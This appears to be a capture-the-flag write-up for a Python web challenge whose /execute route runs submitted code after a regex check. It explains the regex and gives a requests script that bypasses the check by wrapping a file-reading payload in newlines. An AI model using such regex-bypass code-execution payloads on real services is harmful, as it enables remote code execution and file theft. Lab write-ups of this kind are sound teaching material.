# Main idea

It is simple web app on python with single route `/execute`:

![](../../attachments/Pasted%20image%2020240115133516.png)

It is a form with one parameter `code`.

# Solution

If our payload in `code` parameter passes the regular expression it will execute python code.

Lets break down regular expression to execute our code.

- `.*` : This part of the pattern matches any character (except a newline) 0 or more times.
- `[\x20-\x7E]` : This is a character set that matches any character in the range from `\x20` to `\x7E`. This range includes all printable ASCII characters.
- `+` : This means one or more of the preceding element. In this case, it refers to one or more of any character in the range `\x20` to `\x7E`.
- `.*` : Again, this part of the pattern matches any character (except a newline) 0 or more times.

So, the entire regular expression `".*[\x20-\x7E]+.*"` will match any string that has one or more printable ASCII characters anywhere, except first and last character.

According to this information we can crate our payload.

Solution script:

```python
import requests

# url = "https://uoftctf-no-code.chals.io/execute"
url = "http://localhost:1337/execute"

r = requests.post(url, data={'code': b'\nopen("flag.txt", "r").read()\n'})

print(r.text)
```

Our payload passes the regex beacause first and last charracters are new line characters `\n`.

And boom we get the flag.

![](../../attachments/Pasted%20image%2020240115134526.png)

